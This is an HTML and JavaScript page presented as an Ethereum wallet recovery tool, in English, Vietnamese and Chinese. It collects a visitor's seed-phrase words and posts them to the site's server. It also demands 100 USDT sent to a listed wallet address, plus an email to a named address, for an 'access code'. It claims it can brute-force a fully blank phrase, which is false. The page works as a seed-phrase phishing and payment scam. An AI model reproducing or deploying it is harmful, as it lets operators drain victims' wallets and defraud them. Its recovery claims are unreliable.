<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Recover Ethereum Wallet</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
      background: #121212;
      color: #fff;
    }
    h1 {
      text-align: center;
      color: #ffffff;
    }
    .inputs {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(100px, 1fr));
      gap: 10px;
      margin-bottom: 20px;
    }
    input {
      padding: 10px;
      font-size: 16px;
      width: 100%;
      background: #333;
      color: #fff;
      border: 1px solid #444;
      border-radius: 5px;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      margin-right: 10px;
      cursor: pointer;
      background: #444;
      color: #fff;
      border: 1px solid #555;
      border-radius: 5px;
    }
    button:hover {
      background: #555;
    }
    pre {
      background: #222;
      color: #0f0;
      padding: 10px;
      white-space: pre-wrap;
      max-height: 400px;
      overflow-y: auto;
      border-radius: 5px;
    }
    .note {
      font-style: italic;
      color: #ddd;
      margin-bottom: 10px;
    }
    .top-bar {
      display: flex;
      flex-direction: column;
      gap: 10px;
      margin-bottom: 10px;
    }
    .top-controls {
      display: flex;
      justify-content: space-between;
    }
    .language-select, .word-count-select {
      background: #333;
      padding: 5px 10px;
      border-radius: 5px;
    }
    select {
      background: #333;
      color: #fff;
      border: none;
      padding: 5px;
      border-radius: 5px;
    }
    .trial-note {
      color: red;
      font-size: 12px;
    }
    #paymentInfo {
      font-size: 12px;
      max-width: 100%;
      background: #222;
      padding: 10px;
      border-radius: 5px;
      line-height: 1.6;
    }
    code {
      color: #0f0;
    }
    .copy-btn {
      font-size: 12px;
      color: #888;
      cursor: pointer;
      background: #444;
      border: 1px solid #555;
      padding: 2px 5px;
      border-radius: 5px;
      text-decoration: none;
    }
    .copy-btn:hover {
      background: #555;
      color: #ccc;
    }
  </style>
</head>
<body>

  <!-- Top bar -->
  <div class="top-bar">
    <div class="top-controls">
      <!-- Word count selector -->
      <div class="word-count-select">
        <label for="wordCountSelector">Seed phrase:</label>
        <select id="wordCountSelector" onchange="renderInputs()">
          <option value="12">12 words</option>
          <option value="24">24 words</option>
        </select>
      </div>

      <!-- Language selector -->
      <div class="language-select">
        <select id="languageSelector" onchange="changeLanguage()">
          <option value="en">English</option>
          <option value="vi">Tiáº¿ng Viá»‡t</option>
          <option value="zh">ç®€ä½“ä¸­æ–‡</option>
        </select>
      </div>
    </div>

    <!-- Payment Info (auto translated) -->
    <div id="paymentInfo"></div>
  </div>

  <!-- Title -->
  <h1 id="title">ğŸ” Recover Wallet from 12 Seed Phrase</h1>

  <!-- Instruction -->
  <p class="note" id="note">
    ğŸ’¡ If you remember the position of any word, please enter it. Otherwise, leave it blank and the system will try all possible combinations to find the wallet.
  </p>

  <!-- Inputs -->
  <div id="inputsContainer" class="inputs"></div>

  <!-- Buttons -->
  <button id="recoverBtn" onclick="recover()">ğŸš€ Find Wallet</button>
  <button onclick="stop()">â›” Stop</button>

  <!-- Trial message -->
  <p id="trialMessage" class="trial-note">You have 5 attempts left. Please try carefully.</p>

  <!-- Result -->
  <h3 id="resultTitle">Result:</h3>
  <pre id="result">â³ Not started...</pre>

  <script>
    let controller = null;
    let wordCount = 12;
    let trialCount = 0;
    const maxTrials = 5;

    function renderInputs() {
      const container = document.getElementById("inputsContainer");
      container.innerHTML = "";
      wordCount = parseInt(document.getElementById("wordCountSelector").value);

      for (let i = 0; i < wordCount; i++) {
        const input = document.createElement("input");
        input.id = `word${i}`;
        input.placeholder = `Word ${i + 1}`;
        container.appendChild(input);
      }
    }

    async function recover() {
      if (trialCount >= maxTrials) {
        alert("You have exceeded the maximum number of attempts.");
        document.getElementById("recoverBtn").disabled = true;
        return;
      }

      controller = new AbortController();
      const signal = controller.signal;

      const btn = document.getElementById("recoverBtn");
      btn.innerText = "ğŸ” Finding Wallet...";
      btn.disabled = true;

      const words = [];
      for (let i = 0; i < wordCount; i++) {
        let word = document.getElementById(`word${i}`).value.trim();
        words.push(word || "");
      }

      document.getElementById("result").innerText = "";

      try {
        const res = await fetch("/recover", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ seed: words }),
          signal
        });

        const reader = res.body.getReader();
        const decoder = new TextDecoder("utf-8");
        let resultText = "";

        while (true) {
          const { done, value } = await reader.read();
          if (done) break;
          resultText += decoder.decode(value);
          document.getElementById("result").innerText = resultText;
        }
      } catch (err) {
        document.getElementById("result").innerText += "\nâš ï¸ Process stopped or an error occurred.\n";
      }

      trialCount++;
      if (trialCount >= maxTrials) {
        alert("You have exceeded the maximum number of attempts.");
        document.getElementById("recoverBtn").disabled = true;
      }

      btn.innerText = "ğŸš€ Find Wallet";
      btn.disabled = false;
    }

    function stop() {
      if (controller) controller.abort();
      document.getElementById("result").innerText += "\nâ›” Stopped.";
      const btn = document.getElementById("recoverBtn");
      btn.innerText = "ğŸš€ Find Wallet";
      btn.disabled = false;
    }

    function changeLanguage() {
      const lang = document.getElementById("languageSelector").value;

      if (lang === "en") {
        document.getElementById("title").innerText = "ğŸ” Recover Wallet from 12 Seed Phrase";
        document.getElementById("note").innerText = "ğŸ’¡ If you remember the position of any word, please enter it. Otherwise, leave it blank and the system will try all possible combinations to find the wallet.";
        document.getElementById("recoverBtn").innerText = "ğŸš€ Find Wallet";
        document.getElementById("resultTitle").innerText = "Result:";
        document.getElementById("result").innerText = "â³ Not started...";
        document.getElementById("paymentInfo").innerHTML = `
          <b>ğŸ”” Note:</b><br/>
          - Send <b>100 USDT</b> on <b>BSC or ERC20</b> network to wallet address:<br/>
          <code>0x9F3BCa02E939E20D4A86C0bC82c70406D8D8Ee17</code>
          <button class="copy-btn" onclick="copyAddress()">Copy address</button><br/>
          - Then email your wallet address to: <b>idodangha@gmail.com</b> to receive your lifetime access code.
          <button class="copy-btn" onclick="copyEmail()">Copy Email</button>
        `;
      } else if (lang === "vi") {
        document.getElementById("title").innerText = "ğŸ” KhÃ´i phá»¥c vÃ­ tá»« 12 Seed Phrase";
        document.getElementById("note").innerText = "ğŸ’¡ Náº¿u báº¡n nhá»› vá»‹ trÃ­ tá»« khÃ³a nÃ o thÃ¬ hÃ£y Ä‘iá»n vÃ o Ã´ Ä‘Ã³. Náº¿u Ä‘á»ƒ trá»‘ng táº¥t cáº£ há»‡ thá»‘ng sáº½ tá»± Ä‘á»™ng thá»­ táº¥t cáº£ cÃ¡c tá»• há»£p cÃ³ thá»ƒ Ä‘á»ƒ tÃ¬m vÃ­.";
        document.getElementById("recoverBtn").innerText = "ğŸš€ TÃ¬m vÃ­";
        document.getElementById("resultTitle").innerText = "Káº¿t quáº£:";
        document.getElementById("result").innerText = "â³ ChÆ°a báº¯t Ä‘áº§u...";
        document.getElementById("paymentInfo").innerHTML = `
          <b>ğŸ”” LÆ°u Ã½:</b><br/>
          - Gá»­i <b>100 USDT</b> trÃªn máº¡ng <b>BSC hoáº·c ERC20</b> Ä‘áº¿n Ä‘á»‹a chá»‰ vÃ­:<br/>
          <code>0x9F3BCa02E939E20D4A86C0bC82c70406D8D8Ee17</code>
          <button class="copy-btn" onclick="copyAddress()">Copy address</button><br/>
          - Sau Ä‘Ã³ gá»­i Ä‘á»‹a chá»‰ vÃ­ cá»§a báº¡n tá»›i email: <b>idodangha@gmail.com</b> Ä‘á»ƒ nháº­n mÃ£ truy cáº­p vÄ©nh viá»…n.
          <button class="copy-btn" onclick="copyEmail()">Copy Email</button>
        `;
      } else if (lang === "zh") {
        document.getElementById("title").innerText = "ğŸ” ä» 12 ä¸ª Seed Phrase æ¢å¤é’±åŒ…";
        document.getElementById("note").innerText = "ğŸ’¡ å¦‚æœæ‚¨è®°å¾—æŸä¸ªå•è¯çš„ä½ç½®ï¼Œè¯·å¡«å†™å®ƒã€‚å¦‚æœå…¨éƒ¨ç•™ç©ºï¼Œç³»ç»Ÿå°†å°è¯•æ‰€æœ‰å¯èƒ½çš„ç»„åˆæ¥æ‰¾å›é’±åŒ…ã€‚";
        document.getElementById("recoverBtn").innerText = "ğŸš€ æŸ¥æ‰¾é’±åŒ…";
        document.getElementById("resultTitle").innerText = "ç»“æœï¼š";
        document.getElementById("result").innerText = "â³ å°šæœªå¼€å§‹...";
        document.getElementById("paymentInfo").innerHTML = `
          <b>ğŸ”” æ³¨æ„ï¼š</b><br/>
          - è¯·å‘é€ <b>100 USDT</b>ï¼ˆé€šè¿‡ <b>BSC æˆ– ERC20</b> ç½‘ç»œï¼‰åˆ°ä»¥ä¸‹é’±åŒ…åœ°å€ï¼š<br/>
          <code>0x9F3BCa02E939E20D4A86C0bC82c70406D8D8Ee17</code>
          <button class="copy-btn" onclick="copyAddress()">Copy address</button><br/>
          - ç„¶åå°†æ‚¨çš„é’±åŒ…åœ°å€å‘é€è‡³é‚®ç®±ï¼š<b>idodangha@gmail.com</b>ï¼Œä»¥è·å–æ°¸ä¹…è®¿é—®ç ã€‚
          <button class="copy-btn" onclick="copyEmail()">Copy Email</button>
        `;
      }
    }

    function copyAddress() {
      const address = document.querySelector("#paymentInfo code").textContent;
      navigator.clipboard.writeText(address).then(() => {
        alert("Address copied to clipboard!");
      }).catch(err => {
        alert("Failed to copy address: " + err);
      });
    }

    function copyEmail() {
      const email = "idodangha@gmail.com";
      navigator.clipboard.writeText(email).then(() => {
        alert("Email copied to clipboard!");
      }).catch(err => {
        alert("Failed to copy email: " + err);
      });
    }

    window.onload = () => {
      renderInputs();
      changeLanguage();
    };
  </script>
</body>
</html>
